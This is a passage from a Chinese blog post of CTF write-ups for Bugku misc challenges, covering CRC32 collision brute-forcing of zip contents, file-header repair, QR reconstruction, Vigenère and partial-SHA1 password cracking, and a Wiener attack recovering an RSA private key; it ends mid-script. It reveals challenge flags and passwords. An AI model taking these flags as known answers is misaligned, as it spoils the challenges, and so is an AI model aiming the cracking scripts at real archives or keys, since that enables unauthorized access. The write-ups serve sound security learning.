title="好多压缩包"></a>好多压缩包</h2><p>123.zip里有68个压缩包，每个压缩包里都有个data.txt，大小只有4，应该就是CRC32碰撞了</p><p>代码在python2.7环境下运行，跑得有点久</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2.7</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 12:43</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : CRC32碰撞.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        <span class="comment"># print s</span></span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">r'E:\CTF\misc\Bugku\123\out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">r'E:\CTF\misc\Bugku\123\out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>得到碰撞出来的值，</p><blockquote><p>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</p></blockquote><p>base64解码后转为16进制</p><p>注意不能找在线的base64解码，会漏掉00。16进制保存在winhex里</p><blockquote><p>cf90 7300 000d 0000 0000 0000 00aa 3e7a<br>0080 2300 4900 0000 5400 0000 0286 34ab<br>fe6b 631d 491d 3303 0001 0000 0043 4d54<br>0915 14cb dd41 4f95 2448 d3e8 8f98 4511<br>5141 46f7 9f1d 2042 7c6d 2bb8 69ca 9f28<br>2c33 28fc 4816 991f 1b18 1d8f 382c 4676<br>e1c5 ed67 4d72 de4d 4ad5 8274 be92 bd1f<br>0a94 cdbe aef7 3f22 804a f774 2090 2d00<br>1d00 0000 1d00 0000 0262 d1e7 d54f 631d<br>491d 3008 0020 0000 0066 6c61 672e 7478<br>7400 b034 6966 6669 7820 7468 6520 6669<br>6c65 2061 6e64 2067 6574 2074 6865 2066<br>6c61 67c4 3d7b 0040 0700 </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 14:05</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : bugku-base64解码.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">r'E:\CTF\misc\Bugku\123\out.txt'</span>, <span class="string">'r'</span>)</span><br><span class="line">s = f.read()</span><br><span class="line">text = base64.b64decode(s)</span><br><span class="line">print(text)</span><br><span class="line">ff = open(<span class="string">r'E:\CTF\misc\Bugku\123\rrr.txt'</span>, <span class="string">'wb'</span>)</span><br><span class="line">ff.write(text)</span><br><span class="line">f.close()</span><br><span class="line">ff.close()</span><br></pre></td></tr></table></figure><p>可以看到<code>fix the file and get the flag</code>得知我们需要修复文件就可以得到flag：</p><p> <img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796798904.png" alt="1526796798904"></p><p>我们知道C4 3D 7B 00 40 07 00为rar文件的十六进制结尾，所以我们需要在文件头部添加rar文件的十六进制头52 61 72 21 1A 07 00，然后另存为rar文件。打开rar文件，在注释中得到flag： </p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796711735.png" alt="1526796711735"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796865616.png" alt="1526796865616"></p><blockquote><p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p></blockquote><p>参考：</p><p><a href="https://www.cnblogs.com/WangAoBo/p/6951160.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6951160.html</a></p><h2 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h2><p>解压有flag.rar，flag.rar解压有个flag.txt，flag.txt显示flag is not here</p><p>找writeup，修改下图圈出来的为74</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526792542138.png" alt="1526792542138"></p><p>这时候发现flag.rar有个secret.png</p><p>png查看16进制，发现是GIF开头，改为gif后缀，2345看图王分解为两帧，然而2345看图王分解的帧用stegsolve看不到二维码，后来用firework弄两个gif，一个gif删去状态1，一个gif删除状态2</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526796957091.png" alt="1526796957091"></p><p>用windows自带的画图工具拼接起来</p><p>上面左边和右边的角缺失了，可以拿左下角的复制过去补一补</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526797486238.png" alt="1526797486238"></p><blockquote><p>flag{yanji4n_bu_we1shi}  </p></blockquote><p>参考：<a href="https://www.cnblogs.com/blili/p/9013555.html" target="_blank" rel="noopener">https://www.cnblogs.com/blili/p/9013555.html</a></p><h2 id="妹子的陌陌"><a href="#妹子的陌陌" class="headerlink" title="妹子的陌陌"></a>妹子的陌陌</h2><blockquote><p>想要妹子陌陌号吗？<br>做题来拿吧</p><p>下载这个图片做题</p><p><a href="http://120.24.86.145:8002/misc/momo.jpg" target="_blank" rel="noopener">http://120.24.86.145:8002/misc/momo.jpg</a></p></blockquote><p>虽然今天520对我来说没关系，但我一定要贴这个题目的妹子出来</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785441283.png" alt="1526785441283"></p><p>binwalk发现有RAR，分解出来，RAR需要密码</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526785587525.png" alt="1526785587525"></p><p>尝试多种方法解密不成功，看看大佬writeup，密码就是妹子图片红色字:喜欢我吗.</p><p>momo.txt</p><blockquote><p>嘟嘟嘟嘟<br>士兵：报告首长！已截获纳粹的加密电报！<br>首长：拿来看看</p><p>电报内容：<br>····/-/-/·–·/—···/-··-·/-··-·/·/-·/-·-·/—/-··/·/·-·-·-/-·-·/····/·-/····/··-/—/·-·-·-/-·-·/—/–/-··-·</p><p>首长：我操你在逗我吗？你确定是他们纳粹发的吗？<br>士兵：难道我弄错了？哦。。。等等是这一条</p><p>内容：<a href="http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="noopener">http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a><br>      AES Key：@#@#￥%……￥￥%%……&amp;￥</p><p>士兵：二维码真的扫不出来吗？？肯定可以扫出来</p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526786983633.png" alt="1526786983633"></p><p>摩斯密码解密得一个网址</p><blockquote><p><a href="http://encode.chahuo.com/" target="_blank" rel="noopener">http://encode.chahuo.com/</a></p></blockquote><p>打开一看是一个解密的，再看看</p><blockquote><p><a href="http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=" target="_blank" rel="noopener">http://c·bugku·com/U2FsdGVkX18tl8Yi7FaGiv6jK1SBxKD30eYb52onYe0=</a></p><p>AES Key：@#@#￥%……￥￥%%……&amp;￥</p></blockquote><p>拿网址U2F这串字符去AES解密，得momoj2j.png</p><p>访问</p><blockquote><p><a href="http://c.bugku.com/momoj2j.png" target="_blank" rel="noopener">http://c.bugku.com/momoj2j.png</a></p></blockquote><p>看到一个二维码，一看就是黑白反转了</p><p>拿stegsolve反转一下，扫描二维码得</p><blockquote><p>KEY{nitmzhen6}  </p></blockquote><h2 id="就五层你能解开吗"><a href="#就五层你能解开吗" class="headerlink" title="就五层你能解开吗"></a>就五层你能解开吗</h2><blockquote><p>链接: <a href="http://pan.baidu.com/s/1i4TQoz7" target="_blank" rel="noopener">http://pan.baidu.com/s/1i4TQoz7</a> 密码: w65m</p><p>提示：</p><p>第一层：CRC32 碰撞</p><p>第二层：维吉尼亚密码</p><p>第三层：sha1 碰撞</p><p>第四层：md5 相同文件不同</p><p>第五层：RSA</p></blockquote><h3 id="第一层-CRC32-碰撞"><a href="#第一层-CRC32-碰撞" class="headerlink" title="第一层  CRC32 碰撞"></a>第一层  CRC32 碰撞</h3><p>打开压缩包，发现大小都为6，可以用CRC32碰撞，大于6的基本不要用CRC32碰撞了</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799814333.png" alt="1526799814333"></p><p>碰撞脚本：<a href="https://github.com/theonlypwner/crc32" target="_blank" rel="noopener">https://github.com/theonlypwner/crc32</a></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799929576.png" alt="1526799929576"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799897601.png" alt="1526799897601"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799909515.png" alt="1526799909515"></p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526799918380.png" alt="1526799918380"></p><p>从里面选取有意义的字符串连接起来。发现可以连成</p><blockquote><p>_CRC32_i5_n0t_s4f3</p></blockquote><p>输入密码解压。解压成功。</p><h3 id="第二层-维吉尼亚密码"><a href="#第二层-维吉尼亚密码" class="headerlink" title="第二层  维吉尼亚密码"></a>第二层  维吉尼亚密码</h3><blockquote><p>你知道维吉尼亚密码吗？<br>我们给了keys.txt，唯一的密钥就在其中，那么解密ciphertext.txt里的密文吧！<br>解压密码就在明文里，祝你好运！</p><p>Do you know the Vigenére Ciphers?<br>We gave the keys.txt, Only have a key in it, So decrypts ciphertext.txt!<br>Unzip Password in plaintext, good luck to you!</p></blockquote><blockquote><p>在线爆破vigenere ：<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526800422226.png" alt="1526800422226"></p><p>但不对，在key里面找一找类似的 （直接writeup拿了）</p><blockquote><p>YEWCQGEWCYBNHDHPXOYUBJJPQIRAPSOUIYEOMTSV</p></blockquote><p><a href="http://tool.bugku.com/jiemi/解密得" target="_blank" rel="noopener">http://tool.bugku.com/jiemi/解密得</a></p><blockquote><p>the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny</p></blockquote><p>解压密码</p><blockquote><p> vigenere cipher funny</p></blockquote><h3 id="第三层：sha1-碰撞"><a href="#第三层：sha1-碰撞" class="headerlink" title="第三层：sha1 碰撞"></a>第三层：sha1 碰撞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">恭喜!</span><br><span class="line"></span><br><span class="line">现在我们遇到一个问题,我们有一个zip文件,但我们不知道完整的解压密码。</span><br><span class="line">幸好我们知道解压密码的一部分sha1值。</span><br><span class="line">你能帮我们找到的密码吗?</span><br><span class="line"></span><br><span class="line">不完整的密码：&quot;*7*5-*4*3?&quot;  *代表可打印字符</span><br><span class="line"></span><br><span class="line">不完整的sha1：&quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot;  *代表可打印字符</span><br><span class="line"></span><br><span class="line">人生苦短，我用Python。</span><br><span class="line"></span><br><span class="line">Congratulations!</span><br><span class="line">Now we run into a problem,We have a zip file, but we don&apos;t know the complete unzip password.</span><br><span class="line">Fortunately, we know that part of the unzip password of sha1 value.</span><br><span class="line">can you help us to find the password?</span><br><span class="line"></span><br><span class="line">Incomplete password is &quot;*7*5-*4*3?&quot;   * in the range of ASCII printable characters</span><br><span class="line"></span><br><span class="line">Incomplete sha1 is &quot;619c20c*a4de755*9be9a8b*b7cbfa5*e8b4365*&quot;    * in the range of ASCII printable characters</span><br><span class="line"></span><br><span class="line">Life is short, you need Python.</span><br></pre></td></tr></table></figure><p>那就上脚本把。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">dic = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+&#123;&#125;:&lt;&gt;?."</span></span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> dic:</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> i3 <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> i4 <span class="keyword">in</span> dic:</span><br><span class="line">                fir = <span class="string">'*7*5-*4*3?'</span></span><br><span class="line">                poc = i1+<span class="string">'7'</span>+i2+<span class="string">'5-'</span>+i3+<span class="string">'4'</span>+i4+<span class="string">'3?'</span></span><br><span class="line">                <span class="comment"># print('%s'%(poc))</span></span><br><span class="line">                dest = <span class="string">'619c20c'</span></span><br><span class="line">                next  =hashlib.sha1(poc.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">                <span class="comment"># print()</span></span><br><span class="line">                <span class="keyword">if</span> str(next).startswith(dest):</span><br><span class="line">                    print(poc+<span class="string">'    '</span>+next)</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526801565250.png" alt="1526801565250"></p><p>解压密码</p><blockquote><p>I7~5-s4F3?</p></blockquote><h3 id="第四层：md5-相同文件不同"><a href="#第四层：md5-相同文件不同" class="headerlink" title="第四层：md5 相同文件不同"></a>第四层：md5 相同文件不同</h3><blockquote><p>Hello World ;-)<br>MD5校验真的安全吗？<br>有没有两个不同的程序MD5却相同呢？<br>如果有的话另一个程序输出是什么呢？<br>解压密码为单行输出结果。</p><p>Hello World ;-)<br>MD5 check is really safe?<br>There are two different procedures MD5 is the same?<br>If so what is the output of another program?<br>The decompression password is a single-line output.</p></blockquote><p><a href="https://blog.csdn.net/liangkwok/article/details/7441867" target="_blank" rel="noopener">https://blog.csdn.net/liangkwok/article/details/7441867</a></p><p><a href="https://blog.csdn.net/sysprogram/article/details/73753354" target="_blank" rel="noopener">https://blog.csdn.net/sysprogram/article/details/73753354</a></p><p>摘录</p><blockquote><p>两个程序的文件内容不一样，运行的效果打印的东西不一样，一个打印循环打印Goodbye World，一个只打印Hello world。但是md5却一样。 </p></blockquote><p>于是解压密码为</p><blockquote><p>Goodbye World :-( </p></blockquote><h3 id="第五层：RSA"><a href="#第五层：RSA" class="headerlink" title="第五层：RSA"></a>第五层：RSA</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526801812916.png" alt="1526801812916"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&gt; openssl rsa -pubin -text -modulus -in rsa_public_key.pem</span><br><span class="line">Public-Key: (1026 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    02:8f:ff:9d:d3:e6:fe:97:81:64:9e:b7:fe:5e:93:</span><br><span class="line">    03:cf:69:63:47:c4:11:0b:c4:ba:39:69:f0:b1:16:</span><br><span class="line">    69:84:0c:51:d8:1a:68:42:b6:df:2b:09:0f:21:cd:</span><br><span class="line">    76:d4:37:1a:8c:0e:47:04:8c:96:5e:ca:5b:46:91:</span><br><span class="line">    3a:fb:b8:da:05:20:72:a0:56:6d:70:39:c6:18:ab:</span><br><span class="line">    a9:06:57:59:b0:59:e2:9e:48:5d:c5:06:1a:16:ac:</span><br><span class="line">    63:12:94:38:d9:35:4e:65:df:57:47:54:6b:85:db:</span><br><span class="line">    3d:69:98:19:c4:b7:73:2d:f9:27:c7:08:4a:5d:52:</span><br><span class="line">    d6:e6:d6:aa:c1:44:62:34:25</span><br><span class="line">Exponent:</span><br><span class="line">    01:f8:fb:a4:10:05:2d:f7:ed:a3:46:2f:1a:ac:d6:</span><br><span class="line">    9e:40:76:04:33:ca:33:57:67:cd:73:05:a3:d0:90:</span><br><span class="line">    80:5a:5f:d4:05:dd:6e:ea:70:e9:8f:0c:a1:e1:cf:</span><br><span class="line">    25:47:48:67:1b:f0:c9:80:06:c2:0e:ee:1d:62:79:</span><br><span class="line">    04:35:09:fe:7a:98:23:8b:43:91:60:a5:61:2d:a7:</span><br><span class="line">    1e:90:45:14:e8:12:80:61:7e:30:7c:3c:d3:31:3f:</span><br><span class="line">    a4:c6:fc:a3:31:59:d0:44:1f:bb:18:d8:3c:af:4b:</span><br><span class="line">    d4:6f:6b:92:97:a8:0a:14:2d:d6:9b:f1:a3:57:cc:</span><br><span class="line">    b5:e4:c2:00:b6:d9:0f:15:a3</span><br><span class="line">Modulus=28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIDANBgkqhkiG9w0BAQEFAAOCAQ0AMIIBCAKBgQKP/53T5v6XgWSet/5ekwPP</span><br><span class="line">aWNHxBELxLo5afCxFmmEDFHYGmhCtt8rCQ8hzXbUNxqMDkcEjJZeyltGkTr7uNoF</span><br><span class="line">IHKgVm1wOcYYq6kGV1mwWeKeSF3FBhoWrGMSlDjZNU5l31dHVGuF2z1pmBnEt3Mt</span><br><span class="line">+SfHCEpdUtbm1qrBRGI0JQKBgQH4+6QQBS337aNGLxqs1p5AdgQzyjNXZ81zBaPQ</span><br><span class="line">kIBaX9QF3W7qcOmPDKHhzyVHSGcb8MmABsIO7h1ieQQ1Cf56mCOLQ5FgpWEtpx6Q</span><br><span class="line">RRToEoBhfjB8PNMxP6TG/KMxWdBEH7sY2DyvS9Rva5KXqAoULdab8aNXzLXkwgC2</span><br><span class="line">2Q8Vow==</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure><p>发现e很大，想到RSA的维纳攻击</p><p>github找了好几个，终于找到个能用的</p><p><a href="https://github.com/orisano/owiener" target="_blank" rel="noopener">https://github.com/orisano/owiener</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 2018/5/20 15:55</span></span><br><span class="line"><span class="comment"># @Author  : Lhaihai</span></span><br><span class="line"><span class="comment"># @File    : RSAowiener.py</span></span><br><span class="line"><span class="comment"># @Software: PyCharm</span></span><br><span class="line"><span class="comment"># @Blog    : http://blog.Lhaihai.wang</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">    Description :</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> owiener</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x01f8fba410052df7eda3462f1aacd69e40760433ca335767cd7305a3d090805a5fd405dd6eea70e98f0ca1e1cf254748671bf0c98006c20eee1d6279043509fe7a98238b439160a5612da71e904514e81280617e307c3cd3313fa4c6fca33159d0441fbb18d83caf4bd46f6b9297a80a142dd69bf1a357ccb5e4c200b6d90f15a3</span></span><br><span class="line">n = <span class="number">0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span></span><br><span class="line">d = owiener.attack(e, n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> d <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">    print(<span class="string">"Failed"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">"Hacked d=&#123;&#125;"</span>.format(d))</span><br></pre></td></tr></table></figure><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803291937.png" alt="1526803291937"></p><p>拿到d</p><blockquote><p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p></blockquote><p>生成私钥</p><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803354777.png" alt="1526803354777"></p><p>解密，打开flag.txt拿到flag</p><blockquote><blockquote><p>openssl rsautl -decrypt -in flag.enc -inkey bugkursa.pem -out flag.txt</p></blockquote></blockquote><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/Bugku-Misc.assets/1526803369199.png" alt="1526803369199"></p><p>或者用脚本解密，来自<a href="http://www.test404.com/post-1107.html" target="_blank" rel="noopener">http://www.test404.com/post-1107.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">0x28FFF9DD3E6FE9781649EB7FE5E9303CF696347C4110BC4BA3969F0B11669840C51D81A6842B6DF2B090F21CD76D4371A8C0E47048C965ECA5B46913AFBB8DA052072A0566D7039C618ABA9065759B059E29E485DC5061A16AC63129438D9354E65DF5747546B85DB3D699819C4B7732DF927C7084A5D52D6E6D6AAC144623425</span></span><br><span class="line">e=<span 